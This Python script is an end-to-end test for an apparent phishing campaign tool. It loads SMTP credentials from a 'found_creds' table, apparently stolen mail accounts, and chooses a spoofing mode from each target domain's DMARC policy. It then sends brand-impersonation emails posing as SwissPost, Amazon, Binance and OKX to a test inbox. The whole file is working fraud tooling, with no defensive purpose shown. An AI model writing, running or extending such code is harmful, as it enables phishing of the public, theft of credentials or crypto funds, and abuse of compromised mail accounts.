"""End-to-end test: exact same flow as bot template send"""
import sys, asyncio
sys.path.insert(0, '/opt/darkvasend')
for m in list(sys.modules):
    if 'auditguard' in m:
        del sys.modules[m]

from auditguard.campaign_sender import _send_one, pick_best_spoof_mode
from auditguard.spoof_templates import get_template
import sqlite3

db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row
smtp = db.execute('SELECT * FROM found_creds WHERE id=5').fetchone()
db.close()

smtp_config = {
    'host': smtp['smtp_host'],
    'port': smtp['smtp_port'],
    'username': smtp['smtp_user'],
    'password': smtp['smtp_password'],
    'from_email': smtp['smtp_user'],
}

# Test each template
for tpl_name in ['swisspost', 'amazon', 'binance', 'okx']:
    tpl = get_template(tpl_name)
    if not tpl:
        continue
    best_mode, dmarc = pick_best_spoof_mode(tpl['from_email'])
    
    print(f'{tpl["brand"]}: ', end='', flush=True)
    result = _send_one(
        smtp_config,
        tpl['from_name'],
        tpl['from_email'],
        'numerique.fiscal@gmail.com',
        tpl['subject'],
        tpl['html'],
        '',
        smtp_config['from_email'],
        tpl.get('reply_to', ''),
        best_mode,
        None,
    )
    if result['success']:
        print(f'ENVOYE (mode={result.get("spoof_mode_used","?")})', flush=True)
    else:
        print(f'ECHEC: {result.get("error","?")}', flush=True)

print('\nTEST COMPLET', flush=True)
